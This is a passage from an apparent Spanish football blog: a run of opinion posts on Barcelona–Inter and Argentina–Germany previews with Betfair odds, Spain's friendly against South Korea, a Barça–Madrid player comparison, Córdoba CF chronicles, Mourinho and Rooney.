aquellos que os manejáis en  el mundo de las apuestas on-line. En una esquina del ring se sienta Mourinho. Confiado. Se sabe vencedor a los puntos. Especulará, evitará los golpes directos, bailará alrededor del rival, protegerá su zona caliente mientras suelta jabs que entretengan la ofensiva del contrario. En la otra esquina se sienta Guardiola. Con la obligación de ser valiente. De nada le sirve una coreografía de golpes intrascendentes, tiene que salir a directo ganador, buscar el KO, evitar la campana que ponga fin a los doce asaltos sin ver al rival en la lona. Los entrenadores son los protagonistas del duelo de esta noche, se ha focalizado el interés en ellos, en su juego de pies, en esa rueda de prensa previa en la que sólo faltó Don King. El sistema, la motivación, responsabilidades inherentes a los técnicos. Aquí nadie habla hoy de estrellas, ni de reencuentros, ni de Eto´o, ni de Ibrahimovic. Todo se reduce al boxeo inteligente sobre el césped. La remontada, nadar contracorriente, golpear primero, cuidar la defensa, ganarse un sitio en el cuadrilátero del Bernabéu. Defender el cinturón de campeón ante el nuevo aspirante.Caer a las puertas de la final es la despedida más triste. El Inter lleva años sin estar tan cerca de alcanzar el sueño, aún siguen viviendo del recuerdo de Helenio Herrera. El 3-1 de San Siro fue la reivindicación de un estilo más ofensivo de lo que se cree y no tan feo como queremos sentenciar. Presión de los delanteros, confianza en los laterales y solvencia en defensa. El 4+3+3 del fútbol. Sin florituras ni pizarras, un bloque que se mueve como una tortuga romana. Tres líneas que salen al campo a porfiar por el balón como si estuviera hecho de oro. Tres centrocampistas que achican y surten como uno solo. Tres delanteros que buscan las zonas despobladas, que caen a banda, que se zafan de la presión rival para asociarse en el área opuesta. Un estilo que Mourinho depuró hasta convertirlo en un Oporto ganador o un Chelsea que fue el agitador de varias Champions. Esta temporada al fin ha encontrado el equilibrio entre ferocidad y eficacia. En parte por ese metegoles llamado Diego Milito, por la lucha garantizada siempre por Motta, por la profundidad de Maicon y, sobre todo, por la estelar actuación de un enganche como Sneijder, líder de un equipo al que siempre le faltó fútbol que cimentara su espectacular pegada.El Barcelona viene de ser campeón. Crédito suficiente para que un resultado adverso, como el de la ida, no los postre bajo la suela interista. La remontada será más lírica que épica. No se sustentará por la lucha ciega sino por el juego ordenado que caracteriza a la plantilla blaugrana.Guardiola no quiere desquiciarse, dejarse la piel es una manera de hablar. Sus hombres saben golear sin que se les salga la camiseta de la calzona. Tienen una virtud única. Son especialistas en la creación, en anudar al rival hasta hacerlo estallar. Cuando Piqué dijo en la previa que su intención era que los rivales odiaran la profesión de futbolista pensaba en aquel Arsenal atenazado, condenado al voyeurismo en los cuartos, o al Madrid inoperante ante la despeinada victoria a domicilio de hace pocas semanas. Vital es encontrar la ruta del gol. Un dos a cero no es ciencia ficción para un equipo acostumbrado a irse en el marcador con la suavidad con la que se engominan el pelo. Hay posibilidades de resurgir, por supuesto, pero para eso deben solidificar una defensa que dejó mucho aire que respirar a la vanguardia rival en Milán. Y que aparezca el genio de Messi, en su versión solidaria y en su versión finalizadora, para llegar a la red de Julio César.Dos estilos antagónicos que hoy se ven las caras en el peldaño previo a la final contra el Bayern. En blanco y negro, con el humo enturbiando la mirada del público, como en Toro Salvaje, la lucha del campeón que quiere volver a serlo. El contrincante que quiere saber que se siente con el trofeo ceñido a la cintura. Dos entrenadores que cargan sobre sus hombros a sus jugadores, a las aficiones, a la prensa, un estilo; y que hoy se ven las caras, de rincón a rincón, esperando que el árbitro libere los guantes y dé paso al espectáculo.La victoria del Barça tiene baja cuota, 1´45 € por euro apostado. Si pensamos que ganará el Inter a domicilio, cosa nada improbable -ya lo hicieron en la anterior eliminatoria ante el Chelsea-, la cuota es de 7´8 €. El empate, que clasifica al Inter, está a 5´4  €, una cuota bastante alta teniendo en cuenta que el Barcelona tendrá que salir a marcar. Si queremos jugar con un resultado fijo podemos apostar al marcador del que todo el mundo habla, un 2-0 clasificatorio para los de Guardiola que está registrado a 8´2 €. Más apuestas en Betfair.com. Aburrido partido preparatorio el que ha jugado España frente a Corea del Sur en Innsbruck. El equipo no ha estado cómodo en ningún momento, atenazado por la presión coreana y sin demasiada lucidez a la hora de buscar soluciones ofensivas. Plácido atrás, con una pareja inédita como la de Marchena y Albiol, pero con un centro del campo inapetente, hueco, con Javi Martínez, Cesc e Iniesta sin mucha comunicación entre ellos, moviendo el balón en horizontal y con una floja proyección ofensiva. La buena noticia durante los primeros minutos fue la aportación de Llorente. Un tipo de jugador que a priori no casa con la movilidad y toque de la selección pero permite otras tácticas en el fútbol del equipo. Más balones al área, el uso del jugador pivote habilitando a los compañeros que llegan, y un arma contra los equipos que se encierran atrás, como los asiáticos hoy, para esos bloques disciplinados que fortifican el área. En la segunda parte ha mejorado algo el juego, tampoco demasiado. Sólo en los últimos minutos y tras el gol de Navas ha despertado un partido intrascendente. España parece querer sacudirse cualquier halo de favoritismo con unos partidos que, a fuerza de probaturas, apagan la chispa de un equipo que funciona con precisión mecánica.Todos los jugadores están teniendo su oportunidad para demostrar que pueden tener un espacio en el once titular. De los no habituales es Jesús Navas el que más está aprovechando esas oportunidades. A un extremo se le exige desparpajo, inventiva, brillantez. No es la losa de Javi Martínez, más ocupado en tapar los agujeros del equipo, o del hoy tibio Pedro, que sigue jugando demasiado lejos del área en estos choques preparatorios. Navas ha conseguido un gol, que no es más que su premio en un partido donde ha demostrado las virtudes de las que presumen en Sevilla desde que subió al primer equipo. Ha lanzado a puerta, ha centrado, ha desbordado a su par, ha protestado, omitido pases a Villa para jugársela directamente… esas cosas que hacen a un jugador sentirse seguro, importante, decisivo. Es una buena noticia, su menuda figura ha sido hoy de las pocas cosas que nos han sacado del sopor.La entrada en el segundo tiempo de Xavi, Xabi Alonso y Villa no ha servido para dotar de fluidez al grupo. Cuando Silva ha entrado al campo más tarde hemos podido ver al tolosarra cerrando el centro del campo atrás. Hay quien opina que Busquets o el propio Martínez lastran demasiado el juego de vanguardia de nuestro combinado. Ninguno de los dos ha hecho buenos partidos, y la solución pasaría por anclar a Alonso atrás, tangencial a los centrales, y dar libertad ofensiva a Xavi con Cesc o Iniesta como acompañantes. Supongo que es una de las dudas que más inquietan a Del Bosque. España ganó la Eurocopa con un jugador en el once titular que no estará en Sudáfrica. La baja de Senna puede pasar de lo táctico a lo anímico como esa sensible posición del juego no encuentro un recambio legítimo.Victor Valdés, en mi modestísima opinión, uno de los mejores porteros del mundo, ha debutado hoy con la selección. Ya van 15, y hablo de memoria, los futbolistas que se visten por primera vez la camiseta roja con el técnico salmantino. Su puesta de largo es, salvo accidente, testimonial. El puesto de Casillas es intocable. Pero yo me alegro por un jugador que lleva años demostrando que está entre los mejores de España y que sorprendentemente nunca había sido tenido demasiado en cuenta por anteriores seleccionadores. Apenas se ha manchado los guantes, la presión coreana no se materializaba en ocasiones. Para ganar el Mundial, intuyo, habrá que ganar a selecciones como esta. Desafiantes, pero poco talentosas, rápidas pero imprecisas, concentradas atrás, desdeñosas con respecto a la creación pero con una capacidad sofocante de achicar balones y controlar el juego del rival.El siguiente partido será contra Polonia. Será un encuentro diferente, ahí ya no habrá tanto experimento. Saldrán los once que debuten contra Suiza en Sudáfrica. Ahí se verá el potencial de un conjunto que hoy ha patrocinado las siestas durante 90 minutos interminables.foto: fifa.com Cada semana, y de la mano de Betfair.com, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. A estas alturas del campeonato, cualquier resultado es posible. El juego de especulaciones en las primeras rondas ya no sirve para nada en este combate. Si besas la lona te vas a la calle. Sin segundas partes, sin mayor duelo. Alemania y Argentina continuarán sus históricas rencillas sobre el césped del Green Point Stadium. Si miramos atrás podemos hablar de dos estilos contrapuestos, los sudamericanos siempre tuvieron mayor querencia por el balón, por la genialidad determinante. Alemania arrastra la leyenda de ser un equipo mecánico, certero, que constriñe el talento, que sustituye el fútbol impredecible por un fútbol frío pero inexpugnable. Hasta ahí lo que dice la historia, pero en este Mundial de Sudáfrica las cosas están siendo tergiversadas por dos entrenadores antagónicos. Dos modelos futbolísticos que mañana se juegan un puesto en las semifinales de la Copa del Mundo.Maradona sigue un planteamiento parvulario. Sus mejores hombres juegan en posición de ataque.El medio campo, sin un 10 de talla mundial, anda un poco demacrado. En la defensa no cuenta con jugadores exultantes, más bien una panda de futbolistas aguerridos y concienciados. Agitándolo en la coctelera sale una táctica que ha demostrado ser rentable. Que el talento se traduzca en goles y que del centro del campo hacia atrás no haya miramientos. Heinze, Mascherano o Demichelis se ocupan de eso, de quemar el pasto con sus tacos. Mientras, Messi, Higuaín y Tévez que sigan marcando goles. Cuatro partidos y cuatro victorias. Como en un patio de colegio. Sin la brillantez de otros años pero moviéndose como un bloque. Maradona, estrella en el backstage del campeonato, no parece un mago de la estrategia, pero sus métodos laxos y su relación de macarra con los compañeros parecen haber prendado a los internacionales. Andan a una con el jefe. Abrazos, dedicatorias, cariño hacia un ídolo que ha sabido gobernar amablemente a los suyos. Se les ve felices, comprometidos y frescos sobre el campo. La soberbia del líder ha servido para unir lo que parecía desunido. El viento sopla a favor y está entrando prácticamente todo, los defensas marcan, el portero es fiable, Verón mantiene los galones. El favoritismo no le viene grande. Maradona se alimenta de aplausos, de alabanzas que refrendan una actitud de outsider, de perdedor con suscripción perpetua a la redención, llevando el timón de una generación maravillosa que lo venera. El Pelusa es historia viva del mundial, y habla como tal, con la elevación de una persona que se sabe importante. Su grupo se ha contagiado de vitalidad, de optimismo. Atrás quedó la angustia por la clasificación, la rebeldía de la afición contra un dios venido a menos. En el Mundial Argentina está demostrando ser candidata a todo. Y Maradona, igual que lo fue en los tiempos sombríos, es más protagonista que sus propios hombres.En el otro lado está Alemania. Los que siempre están. La frase de Lineker se ha convertido en dogma. Si bien Joachim Low ha conseguido sacar al equipo de su habitual corsé. Su apuesta por jugadores diferentes, con un perfil menos cuadriculados y más talentoso, está funcionándole. Mezclan las virtudes habituales del fútbol alemán –achique de espacios, juego rápido en la contra, solidez defensiva, aprovechamiento del balón parado- con esos destellos impredecibles de sus estrellas. El tanto de Özil ante Ghana va en la línea de lo expuesto. La irrupción de Müller, el despliegue habitual de Podolski en el equipo nacional, y la reubicación de Schweinsteiger, han aportado distintas soluciones a la creación germana. No es aquel equipo hermético y lento de las últimas grandes citas. Ahora no sólo pasan rondas, sino que gustan con su juego. Salvo el tropezón inesperado ante Serbia, Alemania ha sabido disfrutar de su fútbol, goleando a Australia y venciendo en un partido revalorizado ante Ghana.Mañana no hay favoritos. Son dos potencias futbolísticas. Dos campeonas del mundo que han demostrado estar en forma para afrontar los tres últimos partidos del Mundial. Argentina saldrá con Mascherano en el centro dándole equilibrio al conjunto. Tal vez Jonás en la derecha tratando de encerrar al conjunto germano por uno de los flancos. Con Verón fundamental en el centro para hacer frente a la potencia de Khedira y con los tres virtuosos arriba. Tévez, Higuaín y Messi. El del Barça está cuajando un buen campeonato. Le falta el gol, esa guinda que consagra a los mejores, pero su verticalidad y su rapidez son una perpetua amenaza para el rival. Mertesacker y Friedrich no son dos centrales excepcionalmente rápidos. Lahm puede ser vital para domar a la pulga. También Boateng, que ha robado protagonismo a Badstuber -tras su affaire Krasic-, si Lio decide alternar las bandas. Alemania tiene mucha fe en Özil, una de las revelaciones del campeonato. Y siempre confiará en Klose. El goleador sobreactúa con la camiseta germana. Lleva dos goles y está entonado. Su participación será determinante para voltear un encuentro que, en mi opinión, está ligeramente inclinado hacia Argentina.La albiceleste parte con ventaja en las apuestas. Su victoria se paga a 2.44 por los 3.35 de Alemania. Se prevé un partido con goles, por la vocación ofensiva de ambos equipos. Para Betfair el gol de Messi se paga a 2.56 y el de Klose a 3.5. Aunque veo interesante jugársela a dos jugadores con capacidad anotadora como Özil y Schweinsteiger. El primero a 6.6 y el jugador del Bayern a 8.6. Aprovechando la idea de Sportyou, y repitiendo la divertida quinielada del año pasado hago un once contra once del partido de hoy. Con espacio para las preferencias personales y con alineaciones aún sin confirmar. [Valdés-Casillas] Son dos porteros incuestionables, para mí los dos mejores del mundo de un par de años a esta parte.He escrito muchas veces en este blog sobre Valdés, no disimulo mis preferencias. No digo que sea mejor que Casillas, no entro en el fangoso campo de las comparaciones absolutas, pero creo que su juego es parte del mérito de un Barça estelar. Está concentrado los noventa minutos, acostumbrado a trabajar partiendo de lo tibio y de la inactividad, tiene un uno contra uno inmejorable y un juego de pies aseado. Bien colocado siempre y con una facilidad increíble para atajar el balón y no despejarlo, fundamental para evitar las segundas jugadas y los saques de esquina –peligrosos con un equipo tan bajito-. Casillas lleva años al primer nivel, es capaz de hacer cosas imposibles y el liderazgo en su equipo es indudable. Rápido en las salidas y muy mejorado en los balones por alto, su punto débil. Con una defensa adelantada como la actual ha demostrado estar ágil en los balones al hueco y la buena racha del equipo y su magnífico mundial le hacen estar seguro y confiado. Aún así, apuesto por Valdés. El Madrid no irá a defender y el guardameta blaugrana tendrá trabajo hoy. [Dani Alves-Sergio Ramos] Son dos laterales de largo recorrido, de los que coquetean con el área rival en cada ataque. Por pulmón y coraje, su labor en el equipo no sólo pasa por cortar el juego rival sino que son claves en el fútbol ofensivo de sus respectivos clubes. Apuesto por el primero porque creo que Alves es un jugador más equilibrado que el de Camas. Tiene mejor disparo y más calidad en los centros. Sergio Ramos es potencia y más riguroso en la defensa pero sus incursiones en el área rival suelen ser más desbaratadas y anárquicas que las del brasileño. Si hoy es como esperamos, será un duelo abierto y Alves tiene muchas posibilidades de detonar la portería rival. [Piqué-Pepe] Ninguno de los dos pasa por su mejor momento. La temporada pasada Piqué era incuestionable pero este año ha comenzado algo desnortado. También Pepe, que está sufriendo mucho en una defensa arriesgada como la que propone Mourinho, con mucho espacio detrás y donde prima menos esa rabia que caracterizaba al portugués. Ahora es más talento que pundonor y ahí su compatriota Carvalho está dando una clase magistral de oficio. Apuesto por Pepe porque el Madrid jugará un paso atrás con su línea defensiva. Allí el bulldog portugués se sentirá a gusto cortando la combinación blaugrana en el balcón del área. [Puyol-Carvalho] Puyol es el mejor defensa que ha dado España en los últimos diez años y no da muestras de desfallecer. Sin embargo voy a apostar por el ex del Chelsea. No es mejor defensa que Puyol pero está haciendo un inicio de temporada buenísimo basándose principalmente en su colocación, su anticipación y su liderazgo. La defensa de Mourinho funciona como un reloj y él es culpable en mucha medida. Hacía mucho tiempo que el equipo no se plantaba en Madrid con una zaga de esta categoría. Si el Madrid saca un resultado positivo hoy será, principalmente, por el desempeño de este jugador. Eso sí, Puyol es tan bueno que como tenga su día no pasará por ahí nadie. Empate. [Abidal-Marcelo] No soy sospechoso de nada. He defendido a Marcelo siempre, aún cuando mis argumentos rozaban la boutade. Ahora ha demostrado ser un jugador de altura.Iba a decir un defensa de altura pero creo que sus bondades atrás palidecen con su desempeño arriba. Me duele por Abidal, un jugador que no goza del cariño de casi nadie, con una labor gris pero siempre efectiva. No brilla demasiado en nada pero es de esos jugadores que aportan equilibrio y un juego mediano pero constante. Sin embargo, el brasileño tiende a ser más decisivo que el francés. [Xavi-Xabi Alonso] El cansancio está haciendo daño a Xavi. Él, que piensa unos segundos antes que el resto, tiene el cerebro tan agotado como las piernas. No está brillando aún, se recupera poco a poco y hasta después del parón navideño intuyo que no estará a su mejor nivel. Xabi Alonso es un jugador que me gustaba mucho en el Liverpool pero que no encontraba vital en el Madrid del año pasado. Tiene buen desplazamiento de balón en largo, desde los riñones del campo, pero muy poca profundidad en el último pase. Buen disparo pero mete pocos goles, y con un margen de mejora que este año se empieza a ver, principalmente por la presencia de Özil, que complementa las carencias del tolosarra. Apuesto por Alonso viendo el actual estado de forma, el mejor fútbol de Xavi está muy por encima que el de Xabi, casi huelga decirlo, pero en el partido de hoy el madridista tendrá más peso. [Busquets-Khedira] Soy un enamorado del juego subterráneo y eficaz de Busquets. Llevo tiempo diciéndolo y sigo siendo coherente. Khedira es un buen jugador, un Gago mejorado, pero lo del catalán no tiene comparación posible. Está en todas, rápido, con criterio cuando tiene la pelota, con rigor cuando le toca defender.Equilibra al conjunto, lo sustenta, él solito cimenta a un equipo ganador. Capaz de caer en ese otro juego sin las ostentaciones de Gattusso, pero con la misma providencial mala baba –fundamental para entender este deporte-. Como dijo Del Bosque, el jugador que le gustaría haber sido. Yo pienso algo parecido. [Iniesta-Özil] Iniesta es otro de los jugadores que sufren el postmundial. Su cerebro sin físico no es nada y se le ve fundido sobre el campo. Algo lento en las decisiones, perseverante en los errores. Özil es un prodigio de técnica, la buena temporada de Ronaldo e Higuaín le deben mucho al alemán. Aporta claridad e innovación en una delantera que viendo a los jugadores que tiene se debatirían entre el tiro lejano y el individualismo. Mesut gana un palmo más de campo, propicia los uno contra uno, sirve las faltas y los corner perfectos para el cabeceo de Ramos, Pepe o Carvalho. Su trabajo está dándole vistosidad al equipo de Mourinho, con tendencia a la introspección y el cerrojo. Özil convierte un equipo feo en algo disfrutable. [Pedro-Di Maria] El argentino está sorprendiéndonos a todos. Venir del Benfica lo hacía puesto en cuarentena, brillar donde brilla Javi García es para el madridismo algo con lo que tener cautela. Tras el mérito con las inferiores y la absoluta de Argentina, la cosa pintaba bien y las sospechas se confirmaron. Es rápido, habilidoso y decidido. No le pesa llevar en el pecho ese yugo que es la enseña madridista. Hoy en día es fundamental en un equipo que recupera las bandas y que trata de asociarse en el dominio contrario. Pedro es otro tipo de jugador, rápido y habilidoso también, solidario y osado, pero con un juego más céntrico que el del fideo. Salió de la nada y ganó un Mundial jugando muchos minutos. Hoy en día es indiscutible en el once del Barcelona. Ideal para el juego de tiralíneas de Messi, Xavi y compañía. Un pivote peculiar, con más velocidad que físico, siempre atento a las paredes y con una definición providencial de cara a puerta. [Messi-Cristiano] Les pongo una X. Creo que Messi es el mejor jugador de la era, imparable, creativo, competitivo, un genio que obliga a frotarse los ojos cuando hace alguna de las suyas. Cristiano es historia viva, un jugador que pasará a los anales del fútbol, pero que carece de algo que Messi posee a raudales: idea de colectivo. Ambos driblan y tiran a puerta excepcionalmente, pero el primero lo hace al servicio de la manada y el segundo a mayor gloria propia. La temporada del portugués a las órdenes de Mourinho está cambiando de alguna manera ese tic egocéntrico sobre el césped. Parece que se asocia más, que busca más al compañero; cosas fundamentales para que el equipo funcione como un mecanismo y no como la suma de muchas piececitas caras. [Villa-Higuaín] Esperaba algo más de Villa este año. Para mí es uno de los mejores delanteros del mundo y su presencia siempre ha sido una amenaza. Le está costando entra en la dinámica blaugrana. Tiene aptitudes de sobra para ser capital en el esquema de Guardiola pero el juego va un segundo por delante de su participación. Es cuestión de tiempo, no hay duda, pero ahora parece algo desdibujado. Por eso apuesto a que la presencia de Higuaín será más importante. Es un jugador al que no idolatro, que me desconcierta muchas veces y que no me da ese cosquilleo que suelen dar los jugadores mágicos con el balón en sus pies. Es un picapedrero, deslucido pero intachable en su trabajo diario. Mete goles, crea ocasiones y siente el equipo como el que más. [Guardiola-Mourinho] He puesto una X porque creo que será un duelo abierto. Ambos moverán sus cartas para el partido de hoy. De estos onces propuestos seguro que cambian algunos nombres. Pep tiene a Maxwell y Mascherano como alternativas y Mou puede sacar a un encorajinado Benzema. La quiniela sería 1 por una razón clara, Guardiola ha ganado los cuatro duelos como entrenador ante el Real Madrid. Sería apostar a caballo ganador. El partido de hoy será difícil de adivinar, hay tanto en juego que una mínima decisión puede hacer girar el clásico. Los dos mejores entrenadores del mundo parten hoy en igualdad de condiciones. Los grupos de Whatsapp de los amigos futboleros son como nuestro Chiringuito doméstico. Entre insultos al árbitro o al jugador de turno, bromas más o menos predecibles y alguna salida de tono; a veces se leen buenos análisis de lo que está pasando en el césped que compartimos, unos en el campo, otros en el hogar y otros, como yo hoy, en el bar. En uno de estos grupos, el que tengo con los tertulianos de Onda Cero que cada lunes a las 15:00 h. nos juntamos en el Gris´s bajo la batuta de Antonio David Jiménez para hablar del Córdoba C.F., el amigo Enrique ha escrito: “el equipo de Oltra es como un león tumbado debajo de un chaparro. Parece que duerme pero cuando te acercas demasiado te deja sin brazo”. Me ha parecido un buen símil para resumir este inicio de temporada en la que el Córdoba ya es co-líder de Segunda División.El equipo blanquiverde sufre como una madre en una función escolar, como un padre en la boda de su hija, como un actor español obligado a vocalizar, como Ekeng dando pataditas. Es una cosa insoportable… el esfínter es un músculo que los cordobesistas trabajamos con la disciplina de un culturista norteamericano de los noventa. Stankevicius, Deivid, Rodás y Cisma son fijos atrás.Con las alternancias en portería de Falcón y Razak –casi todas por ausencias internacionales del ghanés- y pequeños apuntes como el de hoy, un impreciso Gálvez supliendo a Rodas por lesión. En la medular están Luso y Markovic, una pareja en la que uno pone los chistes y el otro las conversaciones inteligentes. Buenos compañeros de mesa en cualquier caso para pasar una velada entretenida. Arriba más experimentos: Xisco, Florín, De Tomás y Pineda –hoy marcó su primer gol con el equipo en Liga- son los puntas, y juegan de dos en dos como los petit suisse, y en las bandas Nando, Pedro Ríos o Fidel, casi inédito López Silva.Resumiendo: que tampoco hay mucha tela. Enrique hablaba de leones dormidos pero yo creo que el equipo no es comparable, aún, a ese majestuoso animal. Mi aportación es la siguiente, y que me perdone Enrique por estropear su imagen: el Córdoba es un Yorkshire en la ventana de un bajo. Feo y porculero, pero incansable. Inesperado, cuando pasas por ahí aparece con su molesto ladrido, asomando el morro entre los barrotes, mostrando sus dientecillos afilados. No es majestuoso, ni profundo, pero tiene algo que el Córdoba no ha tenido en mucho tiempo: un valor casi suicida, una constancia enfermiza y un conocimiento muy honrado de sus virtudes y sus defectos.No sé yo si cuando vaya acabando la temporada tendremos un yorkshire, un león o un chihuahuita enclenque y asustadizo. Lo que está claro es que mirar hoy la clasificación es un ejercicio muy placentero para una afición que la temporada pasada vio al equipo arrastrarse como un zombie en la primera temporada de Walking Dead. Más triste que cuando la hija de Scarlett O´Hara se cae del poni.Estoy feliz porque el equipo lucha y gana. No es poco en una Liga en la que equipos llamados a comandar están en la cola de la clasificación. Y no me gusta señalar, eh, U.D. Almería. Oltra está llevando al equipo donde quiere. Y los jugadores empiezan a devolver el cariño: Xisco está en un momento espectacular, Deivid es una suerte de Baresi canario y Markovic parece jugador de Primera. El equipo carga el juego en las bandas, sin demasiado riesgo en las subidas de los laterales, pero con mucho pivotaje de los delanteros. El centrocampista serbio es un incordio arriba, se suma con alegría y sabe parar el juego cuando conviene. Fidel está vaciándose y Nando es imprevisible, pero da muestras de que será importante. Pedro Ríos parece que juega contra cadetes en algunos tramos del partido, su solidaridad con los compañeros en defensa y su generosidad en el ataque es para darle el Premio Nobel de la Paz. Con la victoria en Lugo, el Córdoba iguala al Osasuna –con el que ya empató a domicilio- y empieza a soñar con el ascenso. Que sí, que la competición es muy larga, que sí, que aún es pronto para celebrar nada. Que si hay que pensar en el Numancia, que visita el Arcángel la semana que viene aún invicto.Que sí. Pero qué buena pinta tiene este equipo, y que bonitos son los domingos cuando se gana. ¿O ya se os ha olvidado lo del año pasado? Ya no hablamos de palmas en el himno, ni siquiera de las patochadas de González. Ya sólo hablamos de fútbol. Y qué gusto. – Foto sacada del Twitter Deivid: https://twitter.com/deividorb15Puedes comprar camisetas y equipación del Córdoba CF en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Mourinho no hablará antes del clásico, en su lugar Karanka nos brindará un aburrido paquete de obviedades. No sé cuál será la excusa pero sí adivino las razones: el entrenador portugués es un bromista. Le gusta no aparecer cuando las cámaras lo buscan, como un juego pueril, como demorar un sms para hacerse el interesante con una chica. Las ruedas de prensa son poco más que material de fácil consumo para los medios, una especie de comida rápida de titulares y breves. No hay nada que Guardiola o Mourinho puedan decirnos que nos saque de las sombras y del desconocimiento, los periodistas preguntan lo que preguntan y los entrenadores contestan lo que contestan. Sin embargo, se hace raro que el responsable deportivo del Real Madrid decida esconderse por ahí y evitar el pesado trance.Ya no es estrategia, ni tensión, ni nada que se pueda plasmar sobre el resultado. La normalidad parece anormal en el día a día de Mourinho. Lo usual se retuerce. Hoy todos hablamos de su silencio. Posiblemente sin decir nada esté diciendo más cosas que si hablara media hora con los periodistas. Habrá que traducir su ausencia. A lo mejor quiere decirnos “estamos muy concentrados” o “vamos a cambiar nuestro sistema y no queremos dar pistas”. Tal vez sin decir nada esté diciéndonos que tiene mucho de decir y por eso precisamente calla. Para que nadie sepa lo que mañana sacará al césped, si estará Coentrao, si Benzema e Higuaín jugaran juntos, si Özil tiene posibilidades de estar en el once, si Lass será el lateral derecho. O a lo mejor no tiene nada que decir y todo es una boba broma prenavideña. Karanka, esa suerte de guiñol intrascendente, cubrirá el expediente. Lo que diga será irrelevante, lo importante está en lo que calla el ajedrecista portugués, el silencio nunca fue tan interesante. “Somos gilipollas” gritó un señor detrás de mí. Había fallado Razak y el Numancia lograba empatar el partido. Me gustó ese “somos”. Pensé en qué parte de nosotros juega en el césped. Me gustó pertenecer a ese colectivo. Al de los que asumen los errores de los demás como si fueran propios. Como si ese balón empapado se me hubiera escapado a mí. Es un “nosotros” que eriza la piel, inesperado. Jamás me he sentido tan parte del mundo como en la grada de un estadio. Jamás tan cercano a gente con la que no me une absolutamente nada. Desde el que increpa a Xisco cada domingo al compañero de asiento silencioso, desde el matrimonio que discute detrás de mí a los niños que corretean dos filas más abajo.El fútbol es una estupidez maravillosa. Cuando se pierde y cuando se gana. Yo al fútbol no le pido estética, ni goles, ni estiradas mágicas. Al fútbol sólo le pido un “nosotros” en la grada. El momento en el que te das cuenta de que equipo y afición han acompasado la respiración. Lo de la otra tarde en El Arcángel, vaya. Un esfuerzo mutuo. Y una victoria trabajada por los 11 que pisan la hierba y los casi 18000 que nos levantamos del asiento.Iba a hablar del fútbol humilde, pero creo que todos los equipos son humildes. Desde el Real Madrid al Montilla. Porque nosotros lo hacemos humilde. Los que vamos al estadio, hacemos cola y, en el caso del Arcángel cuando llueve, nos llenamos los pies de barro en los descuidados accesos al estadio. Cuando ese hombre dijo “Somos gilipollas” pensé en qué quizá lo éramos. Por elegir ir al estadio un domingo de lluvia, a ver cómo encajamos un gol. Pero marcó Florín el 3-2 y dio la victoria al equipo blanquiverde y el tipo dijo “Somos la hostia”. Y lo repitió de nuevo, para sí. Y luego apoyó su mano en mi hombro como diciendo “tú también eres la hostia”, y me dieron ganas de hacer lo mismo con el de delante como un “tú la llevas” de ser la hostia en el estadio, como un virus inoculado de norte a preferente, de preferente a sur y luego a tribuna y que todos acabáramos contagiados de ese ser la hostia tras el gol de Florín que dejaba al Córdoba segundo de la Segunda, en un virtual ascenso directo, tan precipitado como gustoso, tan lejano como disfrutable.Quedan muchos partidos. Quedan derrotas justas e injustas. Quedan puntos perdidos, balones al palo y abucheos. Pero el domingo pasado en El Arcángel se vivió algo inesperadamente luminoso, pese al mordisco gris del cielo.Por primera vez, tras la procesión de la temporada pasada, el estadio y el equipo se unieron. En lo bueno y en lo malo. En la salud y en la enfermedad. Hasta que los sueños se rompan. Amén, y lo que surja. Rooney es un delantero incontestable. Técnico, luchador y constante. Uno de los jugadores con los que más he disfrutado en los últimos años. Ni estilizado ni plástico, pero siempre sumándose al juego, marcando goles, martilleando la portería contraria. Con modales toscos, salidas de tono que encienden al rival pero que, íntimamente, nos seducen si el jugador está de nuestro lado. Pilar maestro del Manchester United, un equipo que ha vuelto a por sus fueros siempre con el boxeador de Liverpool en su punta de ataque. Un jugador esencial para entender el renacido fútbol inglés en Europa y que ahora es cuestionado por asuntos no estrictamente deportivos. Los escándalos magnificados por la prensa sensacionalista siempre han estado unidos al fútbol, siempre se han alimentado de las miserias humanas, de los errores y los secretos de los jugadores. Han escarbado hasta dar con el escándalo –prostitución e infidelidad, postrecito amarillo- y lo han exhibido para deleite de un público encantado con conocer y censurar los vicios de los demás como si así higienizaran los propios.Su Mundial fue tan malo como el del resto de compañeros. Desdibujados y ansiosos por ganar, extramotivados tal vez por un entrenador como Capello, sobrepasado por el escaparate inmenso que supone un torneo como éste. Ahí empezó la duda sobre un jugador que había cargado con el irregular Manchester durante toda la temporada, vencedor de Liga pero apeado pronto de Europa. La ausencia ante el Everton el pasado fin de semana ha sido como mantillo para los rumores. La inestabilidad que sucede a una crisis matrimonial o personal –o vital, quién sabe-, pueden ser incompatibles para la práctica del fútbol. Ferguson rechazó los cotilleos y se negó a contestar las preguntas que tocaban, aunque fuera tangencialmente, la vida privada de sus futbolistas. La ausencia del goleador pelirrojo tenía una explicación futbolística.Hoy empieza la Champions para el Manchester United. Rooney venía de jugar prácticamente todo el partido con su selección el pasado martes frente a Suiza, con un gol no celebrado incluido. Lógicamente el mister le dio descanso y más visitando el hostil Goodison Park, de donde Wayne salió hace unos años sin mirar atrás rumbo a Old Trafford. Para Sir Alex el espectáculo empieza hoy. Dos finales en los tres últimos años pueden definir el revivir de un club en Europa. La primera ganada en los penaltis al Chelsea, la segunda perdida sin remisión ante el mejor Barcelona de la historia. En ambas, por cierto, Wayne Rooney en el césped con el 10 que se tatuó en la espalda cuando se vio preparado para liderar a los red devils.Esta noche les visitará el Glasgow Rangers, un equipo venido a menos pero en un partido con ese aroma irresistible del fútbol en las islas. Supongo que Rooney será titular. Será un momento perfecto para espantar a los fantasmas y demostrar de nuevo el talento que fluye de sus botas. Sería beneficioso para el fútbol que la carroña vertida sobre el papel de los periódicos no afecte a la competitividad y el mérito de un delantero estelar como el inglés, que bajo los focos del estadio brille el futbolista y se oscurezca el personaje. Que cada uno limpie su conciencia en casa y dejen al resto disfrutar del espectáculo. Los perdedores tienen cierto encanto. En Hollywood siempre premian a ese antihéroe que sobrevive en el lado salvaje de la vida. Lejos de la gloria, ocasionalmente afortunado, cubierto por ese halo de malditismo que tanto cala en los espectadores. No quiero diseccionar una cultura como la del Atleti, pero es innegable que el equipo de la camiseta rojiblanca ha estado unido históricamente a la decepción. Eso de “El Pupas” define, de alguna manera, una trayectoria de sinsabores. De injustas derrotas cuando tocaban victorias… y viceversa. Nunca me han gustado los sanbenitos, luchar contra el tópico siempre me anima, y eso hizo la temporada pasada el Atlético de Madrid. Empezó mal con Abel Resino, un técnico de la casa que fue de más a menos, dejando 